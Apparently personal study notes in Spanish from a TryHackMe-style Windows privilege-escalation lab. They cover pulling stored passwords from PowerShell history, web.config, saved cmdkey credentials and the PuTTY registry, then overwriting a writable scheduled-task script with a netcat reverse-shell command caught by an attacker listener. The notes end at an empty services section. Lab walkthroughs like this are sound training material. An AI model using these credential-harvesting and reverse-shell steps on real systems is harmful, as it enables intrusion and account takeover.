

## Historia del Powershell

```powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm-unpriv> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz

PS C:\Users\thm-unpriv> type .\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
ls
whoami
whoami /priv
whoami /group
whoami /groups
cmdkey /?
cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z
cmdkey /list
cmdkey /delete:thmdc.local
cmdkey /list
runas /?
cmdkey /list
type .\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Users\thm-unpriv>
```

## Configuración de IIS

```cmd
C:\>type \Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
                <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
                    <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
    <connectionStrings>
        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
    </connectionStrings>

C:\>
```

## Credenciales de Windows guardadas

```powershell
PS C:\Users\thm-unpriv> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz

PS C:\Users\thm-unpriv> runas /savecred /user:mike.katz cmd.exe
Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
PS C:\Users\thm-unpriv>
```

## Credencials guardades de Putty

```cmd
C:\>reg query HKCU\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.

C:\>
```

## Administrador de tareas
- Listamos tareas programadas en el sistema
```cmd
C:\>schtasks
```

- Listamos una tarea especifica y localizamos su carpeta de trabajo
```
C:\>schtasks /query /tn vulntask /fo list /v

Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        12/5/2022 2:29:44 AM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
```

- Vemos los permisos de la carpeta de trabajo, y darnos cuenta que `BUILTIN\Users` tiene Full Access
```
C:\>icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files

C:\>
```
- Abrimos un purto en la máquina de Ataque
```bash
root@ip-10-10-197-81:~# nc -lnvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.210.122 49880 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
wprivesc1\taskusr1

C:\Windows\system32>

```
. Modificamos el bat de la tarea y ejecutamos la tarea programada para enviar el revershell a la máquina de Ataque
```cmd
C:\>echo c:\tools\nc64.exe -e cmd.exe 10.10.197.81 4444 > c:\tasks\schtask.bat

C:\>schtasks /run /tn vulntask
SUCCESS: Attempted to run the scheduled task "vulntask".
```

## Servicios de Windows
- Mostrar los servicios que estan corriendo
```

```